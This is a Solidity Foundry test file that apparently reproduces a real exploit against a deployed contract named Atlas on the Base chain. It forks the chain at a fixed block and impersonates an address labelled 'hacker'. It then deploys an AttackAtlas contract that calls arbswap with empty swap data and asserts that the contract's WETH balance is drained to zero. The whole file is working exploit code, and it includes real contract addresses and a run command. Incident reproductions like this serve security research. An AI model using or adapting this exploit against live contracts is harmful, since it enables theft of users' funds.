// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Atlas, IAtlas} from "../src/bug/Atlas.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackAtlas {
    function attack(address atlasAddr) external {
        Atlas atlas = Atlas(atlasAddr);
        IAtlas.SwapData memory swapdata;
        atlas.arbswap(swapdata);
    }
}

contract AttackAtlasTest is Test {
    address constant atlas = 0x8CB5722179DE0860b0BcE7564b28523bba902D5c;
    address constant weth = 0x4200000000000000000000000000000000000006;
    uint256 constant blockNumber = 10446900;
    address constant hacker = 0x0a64eABc8f5049a0BDE336F79ec9087B98658B9C;

    function setUp() external {
        vm.selectFork(vm.createFork(vm.envString("BASE_RPC_URL"), blockNumber));
    }

    function testAttack() external {
        console.log("Attack Before:");
        console.log(IERC20(weth).balanceOf(atlas));

        _attack();

        console.log("Attack After:");
        console.log(IERC20(weth).balanceOf(atlas));
        assertEq(IERC20(weth).balanceOf(atlas), 0);
    }

    function _attack() internal {
        vm.startPrank(hacker, hacker);
        AttackAtlas attackAtlas = new AttackAtlas();
        attackAtlas.attack(atlas);
        vm.stopPrank();
    }
}

// forge test --match-contract AttackAtlasTest -vvv
